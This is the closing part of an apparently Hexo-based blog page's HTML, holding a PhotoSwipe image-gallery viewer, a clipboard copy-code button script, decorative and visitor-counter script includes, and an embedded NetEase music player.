                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>

<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->

<script src="/js/busuanzi-2.3.pure.min.js"></script>

<!-- ClickLove -->

<script src="/js/clickLove.js"></script>

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->

<link rel="stylesheet" href="/css/clipboard.css">
<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>


<!-- CanvasBackground -->

<script src="/js/dz.js"></script>


    
    <div id="music">
    
    
    
    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
        src="//music.163.com/outchain/player?type=2&id=432506367&auto=1&height=32"></iframe>
</div>

<style>
    #music {
        position: fixed;
        right: 15px;
        bottom: 0;
        z-index: 998;
    }
</style>
    
  </div>
</body>

</html>